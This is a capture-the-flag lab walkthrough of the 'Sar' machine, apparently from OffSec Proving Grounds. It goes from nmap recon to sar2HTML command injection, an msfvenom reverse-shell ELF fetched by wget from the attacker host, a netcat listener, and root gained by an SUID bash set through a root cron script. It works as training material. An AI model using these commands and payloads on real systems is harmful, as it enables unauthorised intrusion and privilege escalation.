# Recon

```console
root@kali:/OSCPv3/offsec_pg/Sar# nmap -Pn -sT -sV 192.168.135.35  -n -p- --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-20 09:05 CST
Warning: 192.168.135.35 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.135.35
Host is up (0.12s latency).
Not shown: 52784 closed ports, 12749 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.44 seconds
```

## HTTP TCP/80

```console
root@kali:/OSCPv3/offsec_pg/Sar# nmap -Pn -sT -sV -sC 192.168.135.35  -n -p 80 --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-20 09:07 CST
Nmap scan report for 192.168.135.35
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.23 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Sar# curl http://192.168.135.35/robots.txt
sar2HTML
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Sar/img/1.png)

```console
root@kali:/OSCPv3/offsec_pg/Sar# searchsploit sar2html
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Sar2HTML 3.2.1 - Remote Command Execution                                                                     | php/webapps/47204.txt
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```console
root@kali:/OSCPv3/offsec_pg/Sar# searchsploit -m 47204
  Exploit: Sar2HTML 3.2.1 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/47204
     Path: /usr/share/exploitdb/exploits/php/webapps/47204.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /OSCPv3/offsec_pg/Sar/47204.txt
```

# Explotation

```console
root@kali:/OSCPv3/offsec_pg/Sar# more 47204.txt 
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html 
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Sar/img/2.png)


```console
root@kali:/OSCPv3/offsec_pg/Sar# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.135 LPORT=443 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

root@kali:/OSCPv3/offsec_pg/Sar# python -m SimpleHTTPServer 9000
Serving HTTP on 0.0.0.0 port 9000 ...
192.168.135.35 - - [20/Nov/2021 09:24:40] "GET /shell.elf HTTP/1.1" 200 -
```

```console
root@kali:/OSCPv3/offsec_pg/Sar# curl http://192.168.135.35/sar2HTML/index.php?plot=;wget%20http://192.168.49.135:9000/shell.elf
...
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Sar/img/3.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Sar/img/4.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Sar/img/5.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Sar/img/6.png)

```console
root@kali:/OSCPv3/offsec_pg/Sar# nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.49.135] from (UNKNOWN) [192.168.135.35] 49500
whoami
www-data
script /dev/null -c bash
Script started, file is /dev/null
www-data@sar:/var/www/html/sar2HTML$ ^Z
[1]+  Detenido                nc -lvnp 443
root@kali:/OSCPv3/offsec_pg/Sar# stty raw -echo
root@kali:/OSCPv3/offsec_pg/Sar# nc -lvnp 443
                                             reset
reset: unknown terminal type unknown
Terminal type? xterm
www-data@sar:/var/www/html/sar2HTML$ export TERM=xterm
www-data@sar:/var/www/html/sar2HTML$ export SHELL=bash
www-data@sar:/var/www/html/sar2HTML$ stty rows 36 columns 144
www-data@sar:/var/www/html/sar2HTML$ 
```

```console
www-data@sar:/var/www/html/sar2HTML$ locate local.txt
/home/local.txt
www-data@sar:/var/www/html/sar2HTML$ cat /home/local.txt
32594fbfb77361de6bddd7c8abb80eb7
```

# Privilege escalation

```console
www-data@sar:/var/tmp$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
love:x:1000:1000:love,,,:/home/love:/bin/bash
```

```console
www-data@sar:/tmp$ wget http://192.168.49.135:9000/linpeas.sh
--2021-11-20 21:14:09--  http://192.168.49.135:9000/linpeas.sh
Connecting to 192.168.49.135:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 634071 (619K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                          100%[===================================================================>] 619.21K   695KB/s    in 0.9s    

2021-11-20 21:14:10 (695 KB/s) - 'linpeas.sh' saved [634071/634071]

www-data@sar:/tmp$ chmod +x linpeas.sh 
www-data@sar:/tmp$ ./linpeas.sh > linpeas.txt

....
....

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh

....
....
```

```console
www-data@sar:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
```

```console
www-data@sar:/tmp$ locate finally.sh
/var/www/html/finally.sh
www-data@sar:/tmp$ nano /var/www/html/finally.sh
www-data@sar:/tmp$ echo "chmod u+s /bin/bash" >> /var/www/html/finally.sh
bash: /var/www/html/finally.sh: Permission denied
www-data@sar:/tmp$ echo "chmod u+s /bin/bash" >> /var/www/html/write.sh 
```

```console
www-data@sar:/tmp$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1113504 Jun  7  2019 /bin/bash
www-data@sar:/tmp$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# cd /root/
bash-4.4# ls
proof.txt  root.txt
bash-4.4# cat proof.txt 
febeeb5ffce0ba5b5cde22a8645fe5ea
```



